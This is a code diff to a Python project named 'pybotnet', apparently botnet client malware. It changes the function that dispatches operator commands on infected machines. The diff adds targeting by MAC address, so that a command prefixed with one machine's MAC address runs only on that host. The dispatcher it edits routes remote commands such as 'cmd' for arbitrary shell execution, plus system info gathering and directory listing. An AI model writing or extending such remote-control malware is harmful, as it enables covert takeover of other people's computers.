@@ -4,12 +4,16 @@ from time import sleep
 from subprocess import check_output
 from os import listdir
 
-import platform
+from uuid import getnode as get_system_mac_addres
+
 
 # pybotnet import
 import util
 
+mac_addres = str(get_system_mac_addres())
+
 scripts_name = {
+    mac_addres: 'system mac_addres',
     "do_sleep": 'do_sleep <scconds> <message>',
     "get_info": 'get_info',
     "cmd": 'cmd <command>',
@@ -34,22 +38,32 @@ def is_command(command) -> bool:
 
 def execute_scripts(command, pybotnet_up_time, logger):
     command_name = get_command_name(command)
+    try:
+        if is_command(command):
 
-    if is_command(command):
-        if command_name == 'do_sleep':
-            return execute_do_sleep(command, logger)
+            if command_name == mac_addres:
+                '''run command just in this system'''
+                logger.info('delete mac addres and run command ')
+                new_command = ' '.join(split_command(command)[1:])
+                return execute_scripts(new_command, pybotnet_up_time, logger)
 
-        elif command_name == 'get_info':
-            return get_info(pybotnet_up_time, logger)
+            elif command_name == 'do_sleep':
+                return execute_do_sleep(command, logger)
 
-        elif command_name == 'cmd':
-            return execute_cmd(command, logger)
+            elif command_name == 'get_info':
+                return get_info(pybotnet_up_time, logger)
 
-        elif command_name == 'ls':
-            return execute_ls(command, logger)
+            elif command_name == 'cmd':
+                return execute_cmd(command, logger)
 
-    logger.error('invalid command; Wrong format')
-    return 'invalid command; Wrong format'
+            elif command_name == 'ls':
+                return execute_ls(command, logger)
+
+        logger.error('invalid command; Wrong format')
+        return 'invalid command; Wrong format'
+
+    except:
+        return 'execute_scripts error'
 
 
 def execute_do_sleep(command, logger):
